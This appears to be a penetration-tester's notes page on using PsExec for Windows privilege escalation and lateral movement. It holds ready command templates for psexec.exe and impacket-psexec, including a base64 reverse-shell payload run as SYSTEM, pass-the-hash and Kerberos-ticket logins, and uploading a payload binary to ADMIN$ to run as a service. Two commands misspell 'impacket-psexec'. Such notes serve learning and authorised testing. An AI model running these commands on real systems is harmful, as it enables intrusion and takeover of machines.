
This note falls under both [Privilege Escalation](../index.md) and [Lateral Movement](../../05.%20Tunneling%20&%20Lateral%20Movement/index.md).
## Overview
---
**PsExec** allows you to execute processes on remote systems, providing a way to run commands or launch programs on another computer over a network.  PsExec allows a user to acquire a SYSTEM level shell via exploiting write privileges in the default `C$` or `ADMIN$` share.

This means that if you can access the `C$` or `ADMIN$` share on a system, you can elevated your privileges to **NT AUTHORITY/SYSTEM.**

## Usage
---

There are multiple different ways to utilize PsExec on a target.

#### Sysinternals Suite (`psexec.exe`)

- Link: https://learn.microsoft.com/en-us/sysinternals/
- Must be ran on a Windows host.

```powershell
# Accept EULA
.\psexec.exe -accepteula

# Execute a PowerShell reverse shell payload on a remote system as SYSTEM
.\psexec.exe \\<target_host> -u <admin_user> -p <admin_pass> -s -i powershell.exe -e <base64_payload>

# Copy a binary to a remote system and execute it as SYSTEM
.\psexec.exe \\<target_host> -u <admin_user> -p <admin_pass> -s -i -c <binary>.exe

# User to Run As                   : -u
# Password of Executing User       : -p
# Execute as NT AUTHORITY/SYSTEM   : -s
# Execute Interactively            : -i
# Copy Local Binary and Execute It : -c
```
#### impacket-psexec

- Link: https://github.com/fortra/impacket
- `impacket-psexec` is the Kali Linux alias for impacket's `psexec.py` script.

```shell
# Psexec via Password
impacket-psxec <domain>/<username>:'<password>'@<target>

# Psexec via Pass-the-Hash
impacket-psexec <domain>/<username>@<target> -hashes <ntlm>:<ntlm>

# Psexec via Kerberos Ticket
export KRB5CCNAME=/path/to/<krb5cc_ticket>
impacket-psexec <domain>/<username>@<target> -k -no-pass

# Optional: add a specific command to execute (default: cmd.exe)
impacket-psxec <domain>/<username>:'<password>'@<target> '<command_to_execute>'

# Return Help                    : help
# Execute Local Commands         : !<local_command>
# Upload Files to Temp Directory : lput <local_file> Temp
```

#### Manual Execution via SC

- This requires no credentials, but write privileges to the ADMIN$ / C$ share.

```cmd
# Copy binary to the ADMIN$ share of a host
copy payload.exe \\<target_host>\ADMIN$

# Create and start a service pointing to uploaded binary
sc \\<target_host> create servicename binPath= "C:\Windows\payload.exe"
sc \\<target_host> start servicename
```

*(Note: The space in `binPath= "C:\Windows\payload.exe"` is intended.)*